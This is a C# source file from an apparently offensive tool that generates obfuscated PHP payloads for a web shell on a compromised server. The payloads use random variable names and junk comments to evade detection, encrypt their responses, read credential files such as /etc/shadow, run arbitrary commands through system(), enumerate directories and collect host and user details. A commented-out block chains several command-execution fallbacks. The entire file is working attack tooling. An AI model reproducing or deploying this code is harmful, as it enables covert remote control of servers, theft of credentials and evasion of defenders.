using System;
using System.Collections.Generic;

namespace bantam_php
{
    class PhpHelper
    {
        /// <summary>
        /// 
        /// </summary>
        public enum INIT_DATA_VARS
        {
            OS = 0,
            CWD,
            FREE_SPACE,
            TOTAL_SPACE,
            RELEASE,
            KERNEL,
            SERVER_IP,
            SERVER_SOFTWARE,
            USER,
            UID,
            GID,
            GROUP,
            PHP_VERSION
        }

        /// <summary>
        /// 
        /// </summary>
        public const string rowSeperator = "|=$=|";

        /// <summary>
        /// 
        /// </summary>
        public const string g_delimiter = ",.$.,";

        /// <summary>
        /// Linux File Locations
        /// </summary>
        public static string linuxFS_ShadowFile         = "/etc/shadow";
        public static string linuxFS_PasswdFile         = "/etc/passwd";
        public static string linuxFS_IssueFile          = "/etc/issue.net";
        public static string linuxFS_hostTargetsFile    = "/etc/hosts";
        public static string linuxFS_ProcVersion        = "/proc/version";
        public static string linuxFS_NetworkInterfaces  = "/etc/network/interfaces";

        /// <summary>
        /// Windows File Locations
        /// </summary>
        public static string windowsFS_hostTargets = "C:\\Windows\\System32\\drivers\\etc\\hosts";

        /// <summary>
        /// OS Commands
        /// </summary>
        public static string linuxOS_PsAux          = "ps aux";
        public static string linuxOS_Ifconfig       = "ifconfig";
        public static string windowsOS_Ipconfig     = "ipconfig";
        public static string windowsOS_TaskList     = "tasklist";
        public static string windowsOS_NetUser      = "net user";
        public static string windowsOS_NetAccounts  = "net accounts";
        public static string windowsOS_Ver          = "ver";
        public static string posixOS_Whoami         = "whoami";

        /// <summary>
        /// 
        /// </summary>
        /// <param name="maxNum"></param>
        /// <returns></returns>
        public static string RandomPHPVar(int maxNum = 16)
        {
            int length = Helper.RandomNumber(maxNum);
            return "$" + Helper.RandomString(1, true) + Helper.RandomString(maxNum - 1, true, true);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="maxNum"></param>
        /// <returns></returns>
        public static string RandomPHPComment(int maxNum = 32)
        {
            //check global cfg check "" if off, and have a slider for amount of comments, and a slider for length of comments
            int length = Helper.RandomNumber(maxNum);
            return "/*" + Helper.RandomString(length, true, true)  + "*/";
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="varName"></param>
        /// <param name="encryptionKey"></param>
        /// <param name="encryptionIV"></param>
        /// <param name="mode"></param>
        /// <returns></returns>
        public static string OpenSSLEncryption(string varName, string encryptionKey, string encryptionIV, string mode = "AES-256-CBC")
        {
            return "echo base64_encode(@openssl_encrypt(" + varName + ", '" + mode + "', '" + encryptionKey + "', OPENSSL_RAW_DATA,'" + encryptionIV + "'));";
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="varName"></param>
        /// <param name="encryptionKey"></param>
        /// <param name="encryptionIV"></param>
        /// <returns></returns>
        public static string McryptEncryption(string varName, string encryptionKey, string encryptionIV)
        {
            string result = string.Empty;
            string padVar = RandomPHPVar();
            string blockBar = RandomPHPVar();

            result = blockBar + " = mcrypt_get_block_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC);" + RandomPHPComment()
                   + padVar + " = " + blockBar + " - (strlen(" + varName + ") % " + blockBar + ");" + RandomPHPComment()
                   + varName + " .= str_repeat(chr(" + padVar + "), " + padVar + ");" + RandomPHPComment()
                   + "echo base64_encode(@mcrypt_encrypt(MCRYPT_RIJNDAEL_128, '" + encryptionKey + "', " + varName + ", MCRYPT_MODE_CBC, '" + encryptionIV + "'));";
            return result;
        }

        /// <summary>
        /// todo possibly kill  the encrytion if empty result
        /// </summary>
        /// <returns></returns>
        public static string EncryptPhpVariableAndEcho(int responseEncryptionMode, ref string encryptionKey, ref string encryptionIV)
        {
            //todo make dynamic/random
            string varName = "$result";
            encryptionIV = EncryptionHelper.GetRandomEncryptionIV();
            encryptionKey = EncryptionHelper.GetRandomEncryptionKey();

            string encryption = RandomPHPComment()
                              + varName + " = base64_encode(" + varName + ");"
                              + RandomPHPComment();

            switch(responseEncryptionMode) {
                case (int)EncryptionHelper.RESPONSE_ENCRYPTION_TYPES.OPENSSL:
                    encryption += OpenSSLEncryption(varName, encryptionKey, encryptionIV);
                    break;
                case (int)EncryptionHelper.RESPONSE_ENCRYPTION_TYPES.MCRYPT:
                    encryption += McryptEncryption(varName, encryptionKey, encryptionIV);
                    break;
                default:
                    encryption += OpenSSLEncryption(varName, encryptionKey, encryptionIV);
                    break;
            }

            encryption += RandomPHPComment();

            return encryption;
        }

        /// <summary>
        /// 
        /// </summary>
        /// 
        public static string InitShellData(bool encryptResponse)
        {
            string osVar = RandomPHPVar();
            string cwdVar = RandomPHPVar();
            string freespaceVar = RandomPHPVar();
            string totalfreespaceVar = RandomPHPVar();
            string releaseVar = RandomPHPVar();
            string kernelVar = RandomPHPVar();
            string serverIpVar = RandomPHPVar();
            string serverSoftwareVar = RandomPHPVar();
            string userVar = RandomPHPVar();
            string uidVar = RandomPHPVar();
            string gidVar = RandomPHPVar();
            string groupVar = RandomPHPVar();
            string phpVersionVar = RandomPHPVar();

            string responseCode = string.Empty;
            string linesRandomized = string.Empty;

            //order of these lines don't matter so we shuffle them around
            List<string> lines = new List<string> {
                osVar + " = 'nix'; if (strtolower(substr(PHP_OS, 0, 3)) == 'win'){ " + osVar + " = 'win';}",

                cwdVar + (" = dirname(__FILE__);" + freespaceVar + " = @diskfreespace(" + cwdVar + ");" 
                       + totalfreespaceVar + " = @disk_total_space(" + cwdVar + ");" + totalfreespaceVar 
                       + " = " + totalfreespaceVar + " ? " + totalfreespaceVar + " : 1;"),

                kernelVar       + " = @php_uname('s');",
                phpVersionVar   + " = phpversion();",
                releaseVar      + " = @php_uname('r');",
                serverIpVar     + " = $_SERVER['SERVER_ADDR'];",
                serverSoftwareVar + " = @getenv('SERVER_SOFTWARE');",
            };

            Helper.ShuffleList(lines);

            foreach(var line in lines) {
                linesRandomized += line;
                linesRandomized += RandomPHPComment();
            }

            if (encryptResponse) {
                responseCode = "$result = " + osVar + ".'" + g_delimiter
                     + "'." + cwdVar + ".'" + g_delimiter
                     + "'." + freespaceVar + ".'" + g_delimiter
                     + "'." + totalfreespaceVar + ".'" + g_delimiter
                     + "'." + releaseVar + ".'" + g_delimiter
                     + "'." + kernelVar + ".'" + g_delimiter
                     + "'." + serverIpVar + ".'" + g_delimiter
                     + "'." + serverSoftwareVar + ".'" + g_delimiter
                     + "'." + userVar + ".'" + g_delimiter
                     + "'." + uidVar + ".'" + g_delimiter
                     + "'." + gidVar + ".'" + g_delimiter
                     + "'." + groupVar + ".'" + g_delimiter
                     + "'." + phpVersionVar + ";";
            } else {
                responseCode = "echo " + osVar + ".'" + g_delimiter
                     + "'." + cwdVar + ".'" + g_delimiter
                     + "'." + freespaceVar + ".'" + g_delimiter
                     + "'." + totalfreespaceVar + ".'" + g_delimiter
                     + "'." + releaseVar + ".'" + g_delimiter
                     + "'." + kernelVar + ".'" + g_delimiter
                     + "'." + serverIpVar + ".'" + g_delimiter
                     + "'." + serverSoftwareVar + ".'" + g_delimiter
                     + "'." + userVar + ".'" + g_delimiter
                     + "'." + uidVar + ".'" + g_delimiter
                     + "'." + gidVar + ".'" + g_delimiter
                     + "'." + groupVar + ".'" + g_delimiter
                     + "'." + phpVersionVar + ";";
            }

            return linesRandomized + "if (!function_exists('posix_getegid')) {" 
                                   + RandomPHPComment()
                                   + userVar + " = @get_current_user();" 
                                   + RandomPHPComment()
                                   + uidVar + " = @getmyuid();" 
                                   + RandomPHPComment()
                                   + gidVar + " = @getmygid();" 
                                   + RandomPHPComment()
                                   + groupVar + " = '?';" 
                                   + RandomPHPComment()
                                   + "} else {" 
	                               + uidVar + " = @posix_getpwuid(posix_geteuid());" 
                                   + RandomPHPComment()
                                   + gidVar + " = @posix_getgrgid(posix_getegid());" 
                                   + RandomPHPComment()
                                   + userVar + "= "+ uidVar + "['name'];" 
                                   + RandomPHPComment()
                                   + uidVar + " = "+ uidVar + "['uid'];" 
                                   + RandomPHPComment()
                                   + gidVar + " = "+ gidVar + "['gid'];" 
                                   + RandomPHPComment()
                                   + groupVar + " = "+ gidVar + "['name'];" 
                                   + RandomPHPComment()
                                   + "}" 
                                   + responseCode 
                                   + RandomPHPComment();
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="code"></param>
        /// <param name="encryptResponse"></param>
        /// <returns></returns>
        public static string PhpInfo(bool encryptResponse)
        {
            if (encryptResponse) {
                return RandomPHPComment() 
                      + "@ob_start();" 
                      + RandomPHPComment()
                      + "@phpinfo();" 
                      + RandomPHPComment()
                      + "$result = @ob_get_contents();" 
                      + RandomPHPComment()
                      + "@ob_end_clean();"
                      + RandomPHPComment();
            } else {
                return RandomPHPComment() 
                       + "phpinfo();" 
                       + RandomPHPComment();
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="encryptReponse"></param>
        /// <returns></returns>
        public static string PhpTestExecutionWithEcho(bool encryptReponse)
        {
            string phpTestExecutionWithEcho = string.Empty;
            if (encryptReponse) {
                phpTestExecutionWithEcho = RandomPHPComment() 
                                         + "$result = '1';" 
                                         + RandomPHPComment();

            } else {
                phpTestExecutionWithEcho = RandomPHPComment() 
                                         + "echo '1';" 
                                         + RandomPHPComment();
            }
            return phpTestExecutionWithEcho;
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="encryptResponse"></param>
        /// <returns></returns>
        public static string GetHardDriveLettersPhp(bool encryptResponse)
        {
            string getHardDriveLetters = string.Empty;
            string driveVar = RandomPHPVar();

            if (encryptResponse) {
                getHardDriveLetters = RandomPHPComment()
                                        + "$result; foreach (range('a', 'z') as " + driveVar + ") {"
                                    + RandomPHPComment()
                                        + "if (is_dir(" + driveVar + @". ':\\')) { "
                                    + RandomPHPComment()
                                        + "$result .= " + driveVar + ".':|';"
                                    + RandomPHPComment()
                                        + "}}"
                                    + RandomPHPComment();
            } else {
                getHardDriveLetters = RandomPHPComment()
                                        + "foreach (range('a', 'z') as " + driveVar + ") {"
                                    + RandomPHPComment()
                                        + "if (is_dir(" + driveVar + @". ':\\')) {"
                                    + RandomPHPComment()
                                        + "echo " + driveVar + ".':|';"
                                    + RandomPHPComment()
                                        + "}}"
                                    + RandomPHPComment();
            }
            return getHardDriveLetters;
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="fileName"></param>
        /// <param name="encryptResponse"></param>
        /// <returns></returns>
        public static string ReadFileProcedure(string fileName, bool encryptResponse)
        {
            if (encryptResponse) {
                return RandomPHPComment() 
                     + @"$result = @is_readable('" + fileName + "') ? file_get_contents('" + fileName + "') : 'File Not Readable';" 
                     + RandomPHPComment();
            } else {
                return RandomPHPComment() 
                     + "echo @is_readable('" + fileName + "') ? file_get_contents('" + fileName + "') : 'File Not Readable';" 
                     + RandomPHPComment();
            }
        }

        /// <summary>
        /// Todo make a user controlled feature as to which function to use, but also use this and call it the something something method
        /// </summary>
        /// <param name="code"></param>
        /// <returns></returns>
        //    public static string executeSystemCode(string code)
        //    {
        //  return @"
        //        if (function_exists('exec')) {
        //            @exec($in, $out);
        //   echo @out;
        //        } elseif(function_exists('passthru')) {
        //            @passthru($in);
        //        } elseif(function_exists('system')) {
        //            @system($in);;
        //        } elseif(function_exists('shell_exec')) {
        //   echo @shell_exec($in);
        //        } elseif(is_resource($f = @popen($in, 'r'))) {
        //   $out = "";
        //            while (!@feof($f))
        //$out .= fread($f, 1024);
        //            pclose($f);
        //            echo $out;
        //        }";
        //    }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="code"></param>
        /// <param name="encryptResponse"></param>
        /// <returns></returns>
        public static string ExecuteSystemCode(string code, bool encryptResponse)
        {
            if (encryptResponse) {
                return RandomPHPComment() 
                    + "@ob_start();" 
                    + RandomPHPComment() 
                    + "@system('" + code + "');" 
                    + RandomPHPComment() 
                    + "$result = @ob_get_contents();"
                    + RandomPHPComment()
                    + "@ob_end_clean();"
                    + RandomPHPComment();
            } else {
                return RandomPHPComment() + "@system('" + code + "');" + RandomPHPComment();
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="location"></param>
        /// <param name="phpVersion"></param>
        /// <returns></returns>
        public static string DirectoryEnumerationCode(string location, string phpVersion, bool responseEncryption)
        {
            string varItem = RandomPHPVar();
            string varFile = RandomPHPVar();

            if (responseEncryption) {
                return RandomPHPComment() 
                 + @" try{ " + RandomPHPComment() 
                 + @"foreach (new DirectoryIterator('" + location + @"') as " + varItem + @") {" + RandomPHPComment() 
                 + @"$result .= " + varItem + "->getBasename().'" + g_delimiter + "'."
                        + varItem + "->getPath().'" + g_delimiter + "'."
                        + "((" + varItem + "->isFile()) ? " + varItem + "->getSize() : '').'" + g_delimiter + "'."
                        + "((" + varItem + "->isFile()) ? 'file' : 'dir').'" + g_delimiter + "'."
                        + varItem + @"->getPerms().'" + rowSeperator + @"';" + RandomPHPComment() + @"
		            }}catch(Exception $e){ }" + RandomPHPComment();
            } else {
                return RandomPHPComment()
                 + @" try{ " + RandomPHPComment()
                 + @"foreach (new DirectoryIterator('" + location + @"') as " + varItem + @") {" + RandomPHPComment()
                 + @"echo " + varItem + "->getBasename().'" + g_delimiter + "'."
                        + varItem + "->getPath().'" + g_delimiter + "'."
                        + "((" + varItem + "->isFile()) ? " + varItem + "->getSize() : '').'" + g_delimiter + "'."
                        + "((" + varItem + "->isFile()) ? 'file' : 'dir').'" + g_delimiter + "'."
                        + varItem + @"->getPerms().'" + rowSeperator + @"';" + RandomPHPComment() + @"
		            }}catch(Exception $e){ }" + RandomPHPComment();
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="windowsOS"></param>
        /// <returns></returns>
        public static string TaskListFunction(bool windowsOS = true)
        {
            return (windowsOS) ? windowsOS_TaskList : linuxOS_PsAux;
        }
    }
}
